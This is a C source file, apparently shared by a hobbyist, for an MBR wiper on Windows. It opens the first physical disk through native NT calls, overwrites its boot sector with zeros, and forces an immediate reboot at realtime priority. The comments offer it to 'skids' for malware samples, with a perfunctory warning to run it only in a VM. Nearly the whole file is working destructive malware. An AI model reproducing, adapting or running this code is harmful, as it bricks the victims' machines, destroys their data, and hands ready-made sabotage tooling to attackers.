// I have been doing windows internals for quite awhile but I havent rlly messed with the mbr, so this is my project for that.
// This is a MBR overwriter that I fine tuned to be as fast as they get, really. I havent tested it cuz uhh why do I have to.
// Normally I work in C++ but I needed more practice with C, also this did take me like 5 hours mostly spent doc reading on how to optimize programs.
// I hope yall little skids use it well.
// Pretty much every comment I make is abt speed.
#include <windows.h>
#include <winternl.h>

// Compiler optimizations for maximum speed
#pragma optimize("s", on)  // Favor size optimizations for smaller, faster code
#pragma pack(push, 1)      // Pack structures tightly to reduce memory overhead

// Memory prefetch hint for critical data structures
#ifdef _MSC_VER
#define PREFETCH(addr) _mm_prefetch((const char*)(addr), _MM_HINT_T0)
#else
#define PREFETCH(addr) __builtin_prefetch((addr), 0, 3)
#endif

// NT kernel API declarations for MBR manipulation - moved to global scope for faster access
typedef NTSTATUS(NTAPI *NtCreateFile_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI *NtWriteFile_t)(
    HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef NTSTATUS(NTAPI *NtSetSystemInformation_t)(ULONG, PVOID, ULONG);

// Global function pointers - loaded once, used multiple times for speed
static HMODULE g_ntdll = NULL;
static NtCreateFile_t g_NtCreateFile = NULL;
static NtWriteFile_t g_NtWriteFile = NULL;
static NtSetSystemInformation_t g_NtSetSystemInformation = NULL;

// Pre-calculated constants for maximum speed
#define DEVICE_PATH L"\\Device\\Harddisk0\\Partition0"
#define DEVICE_PATH_LEN (sizeof(DEVICE_PATH) - sizeof(WCHAR))
#define MBR_SIZE 512

// Optimized CPU binding with high priority for maximum performance
__forceinline void bind_cpu_optimized()
{
    HANDLE hProcess = GetCurrentProcess();
    // Pin to CPU 0 for consistent performance
    SetProcessAffinityMask(hProcess, 1);
    // Set highest priority for fastest execution
    SetPriorityClass(hProcess, REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
}

// Fast NT function loading - called once for all required functions
__forceinline void load_nt_functions()
{
    if (!g_ntdll) {
        g_ntdll = LoadLibraryA("ntdll.dll");
        if (g_ntdll) {
            g_NtCreateFile = (NtCreateFile_t)GetProcAddress(g_ntdll, "NtCreateFile");
            g_NtWriteFile = (NtWriteFile_t)GetProcAddress(g_ntdll, "NtWriteFile");
            g_NtSetSystemInformation = (NtSetSystemInformation_t)GetProcAddress(g_ntdll, "NtSetSystemInformation");
        }
    }
}

// Optimized forced reset - no redundant library loading, marked as noreturn for optimization
__declspec(noreturn) __forceinline void normal_reset()
{
    // Use pre-loaded function pointer for speed
    if (g_NtSetSystemInformation) {
        ULONG shutdownInfo = 1;
        g_NtSetSystemInformation(0x000D, &shutdownInfo, sizeof(shutdownInfo));
    }
    
    // Win32 fallback for compatibility - immediate execution
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
    
    // Should never reach here, but ensure function doesn't return
    for(;;);
}

int main()
{
    // Maximum performance CPU binding and priority
    bind_cpu_optimized();
    
    // Load all NT functions once for speed
    load_nt_functions();

    // Pre-aligned MBR buffer for optimal memory access
    __declspec(align(16)) BYTE mbr[MBR_SIZE] = {0};
    
    // Prefetch MBR buffer into cache for faster write operation
    PREFETCH(mbr);

    // Pre-calculated UNICODE_STRING for fastest access - no runtime calculations
    static const UNICODE_STRING physName = {
        .Length = DEVICE_PATH_LEN,
        .MaximumLength = DEVICE_PATH_LEN + sizeof(WCHAR),
        .Buffer = DEVICE_PATH
    };

    // Pre-initialized OBJECT_ATTRIBUTES for speed
    static const OBJECT_ATTRIBUTES attr = {
        .Length = sizeof(OBJECT_ATTRIBUTES),
        .RootDirectory = NULL,
        .ObjectName = (PUNICODE_STRING)&physName,
        .Attributes = OBJ_CASE_INSENSITIVE,  // Use proper constant
        .SecurityDescriptor = NULL,
        .SecurityQualityOfService = NULL
    };

    IO_STATUS_BLOCK io = {0};
    HANDLE hDevice = NULL;

    // Prefetch critical structures into cache
    PREFETCH(&attr);
    PREFETCH(&io);

    // Open disk for writing - optimized call with pre-loaded function
    if (g_NtCreateFile) {
        g_NtCreateFile(&hDevice, GENERIC_WRITE, (POBJECT_ATTRIBUTES)&attr, &io, NULL, 0, 
                      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
                      FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
    }

    // Write MBR sector at offset 0 - this destroys the bootloader instantly
    if (hDevice && g_NtWriteFile) {
        static const LARGE_INTEGER offset = {.QuadPart = 0};
        g_NtWriteFile(hDevice, NULL, NULL, NULL, &io, mbr, MBR_SIZE, (PLARGE_INTEGER)&offset, NULL);
        CloseHandle(hDevice);
    }

    // Immediate system shutdown using optimized reset
    normal_reset();

    return 0;
}

#pragma pack(pop)  // Restore packing

// Run as administrator
// Quick disclaimer, don't run this on your main system. Because the moment you run it as admin there will be no chance of stopping it besides AV.
// I really only made this for malware samples, so feel free to add.
// Also, dont ask if its UD its not. Js dont use it outside a vm.
// Good luck on not bricking ur pc!

// Changes I made. I added a reliable reset, I havent tested but it should work.
// Additional optimizations added:
// - Global function pointer caching to eliminate redundant DLL loading
// - Memory prefetch hints for critical data structures
// - Compile-time constant pre-calculation instead of runtime calculations  
// - Memory alignment for optimal cache performance
// - Process priority elevation to REALTIME_PRIORITY_CLASS
// - Static structure initialization to reduce stack overhead
// - noreturn attribute for better compiler optimization
// - Pragma pack for tighter memory layout

// I have no vm's sadly
